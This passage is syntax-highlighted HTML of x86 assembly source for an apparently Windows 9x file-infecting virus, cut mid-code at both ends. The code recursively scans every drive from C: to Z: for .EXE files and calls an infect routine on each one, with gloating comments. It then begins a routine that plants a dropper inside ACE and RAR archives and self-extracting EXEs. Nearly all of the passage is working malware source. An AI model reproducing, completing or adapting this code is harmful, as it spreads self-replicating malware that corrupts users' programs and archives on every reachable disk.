        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_start</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;actual sec to bl</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">search_mem_size</span><span class="sc0">     </span><span class="sc1">;size of mem for searching</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_GetHeap</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;were we sucessful ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">init_search_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_address</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">005C3A43h</span><span class="sc0">       </span><span class="sc1">;'C:\\0'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__searching</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_plunge</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">search_all_dirs</span><span class="sc0">
    </span><span class="sc5">__searching_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">init_search_done</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">005Ch</span><span class="sc0">

        </span><span class="sc1">; what disk is it ? fixed ? cd-rom ? ram-disk ? etc. ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">          </span><span class="sc1">;convert to BCD</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdt_flags</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__searching</span><span class="sc0">     </span><span class="sc1">;may I "use" this disk ?</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__searching_end</span><span class="sc0">     </span><span class="sc1">;uaaaaah, i'm crazy... :)</span><span class="sc0">

</span><span class="sc5">init_search_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_address</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMGR_RetHeap</span><span class="sc0">      </span><span class="sc1">;deallocate memory</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">init_search_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                </span><span class="sc1">;restore all regz</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">init_search_done</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;all disks infected?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_finished</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">init_search_exit</span><span class="sc0">

    </span><span class="sc5">__iluzo_return_5</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;find "g_iluzo_return" text</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;in this file for more infoz</span><span class="sc0">

</span><span class="sc5">search_all_dirs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_last_char</span><span class="sc0">     </span><span class="sc1">;pointer of l.c. to edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">58452E2Ah</span><span class="sc0">     </span><span class="sc1">;'*.EX'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0045h</span><span class="sc0">  </span><span class="sc1">;'\0E'</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__calc_in_mem</span><span class="sc0">       </span><span class="sc1">;offs dta in mem to esi</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc0">            </span><span class="sc1">;set attribs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ffindfirst</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;save handle</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__find_dir</span><span class="sc0">      </span><span class="sc1">;error ?</span><span class="sc0">

    </span><span class="sc5">__repeat</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__clean</span><span class="sc0">         </span><span class="sc1">;delete '*.EXE'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.dta_filename</span><span class="sc0">  </span><span class="sc1">;and add file name</span><span class="sc0">
       </span><span class="sc5">__r2</span><span class="sc4">:</span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;copy with zero char</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__r2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;restore esi=dta in memory</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">     </span><span class="sc1">;infect it ! haha huahaha...</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;give time other appz</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;Warning! BL was fill above!</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">init_search_error</span><span class="sc0">   </span><span class="sc1">;EBX isn't anywhere modify !</span><span class="sc0">

    </span><span class="sc5">__continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__calc_in_mem</span><span class="sc0">       </span><span class="sc1">;esi=dta in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;handle of FindFirstFile</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ffindnext</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__repeat</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ffindclose</span><span class="sc0">

     </span><span class="sc5">__find_dir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__clean</span><span class="sc0">         </span><span class="sc1">;remove file name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">002A2E2Ah</span><span class="sc0">     </span><span class="sc1">;add '*.*',0</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__calc_in_mem</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">         </span><span class="sc1">;set attribs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ffindfirst</span><span class="sc0">      </span><span class="sc1">;search directory "only"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__search_exit</span><span class="sc0">

 </span><span class="sc5">__find_in_dir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.dta_fileattr</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">  </span><span class="sc1">;is it directory ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__find_next</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.dta_filename</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">  </span><span class="sc1">;it can't be directory</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__find_next</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_plunge</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_last_char</span><span class="sc0">     </span><span class="sc1">;edi=last char of filename</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.dta_filename</span><span class="sc0">  </span><span class="sc1">;esi=filename</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__clean</span><span class="sc0">         </span><span class="sc1">;remove '*.EXE'</span><span class="sc0">

    </span><span class="sc5">__copy</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;copy directory name and</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;set '\' at the end</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__copy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">005Ch</span><span class="sc0">  </span><span class="sc1">;'\\0'</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">search_all_dirs</span><span class="sc0">     </span><span class="sc1">;search in new directory</span><span class="sc0">

    </span><span class="sc5">__find_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__calc_in_mem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ffindnext</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__find_in_dir</span><span class="sc0">

  </span><span class="sc5">__search_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__clean</span><span class="sc0">         </span><span class="sc1">;remove file name and '\'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;it's out of directory</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_plunge</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__searching_end</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__find_next</span><span class="sc0">

  </span><span class="sc5">__calc_in_mem</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;get pointer to dta in memory</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_plunge</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_address</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__get_last_char</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;edi=last char+1 in filename</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">filename_size</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__clean</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;clean last item in filename</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">search_filename</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_last_char</span><span class="sc0">
        </span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__2</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__iluzo_return_6</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;find "g_iluzo_return" text</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;in this file for more infoz</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ infection in ACE/RAR and ACE/RAR EXE-SFX archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ We Already Know ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   ş ACE/RAR archive certainly exists</span><span class="sc0">
</span><span class="sc1">;   ş in _filename_ has his name</span><span class="sc0">
</span><span class="sc1">;   ş dta is full</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">archive_header_first</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc5">archive_read_length</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

    </span><span class="sc5">errors</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 0.bit     ... fail this function definitived (once for all)</span><span class="sc0">
</span><span class="sc1">; 1.bit     ... allocate buffer for search Archive Magic (Archive_Buffer)</span><span class="sc0">
</span><span class="sc1">; 2.bit     ... set attribs of file (filename_ptr)</span><span class="sc0">
</span><span class="sc1">; 3.bit     ... allocate memory for header</span><span class="sc0">
</span><span class="sc1">; 4.bit     ... open file (file_handle = filename_ptr)</span><span class="sc0">
</span><span class="sc1">; 5.bit     ... open file (dropper_handle = archive_filename)</span><span class="sc0">
</span><span class="sc1">; 6.bit     ... allocate dropper_memory (loaded dropper file)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">infect_ACE_RAR</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc5">Archive_Err</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">          </span><span class="sc1">;set attribs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fsetattr</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">exit_now</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">100b</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prepare_file</span><span class="sc0">        </span><span class="sc1">;eax=CRC32, edi=filepos, ebx=ACE_Archive or RAR_Archive</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">exit_now</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">errors</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1111111111111110b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">RAR_Archive</span><span class="sc0">     </span><span class="sc1">;is it really ACE or RAR ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">infect_RAR</span><span class="sc0">      </span><span class="sc1">;jump if RAR or EXE-SFX RAR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ACEf_CRC32</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__ar_load_header</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ACEh_HeadFlags</span><span class="sc4">-</span><span class="sc5">ACE_header_start</span><span class="sc4">],</span><span class="sc2">2048</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit_now</span><span class="sc0">        </span><span class="sc1">;mult. volume ?</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">ACEh_HeadSize</span><span class="sc4">-</span><span class="sc5">ACE_header_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;add head.crc and head.size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;absolute start in memory</span><span class="sc0">
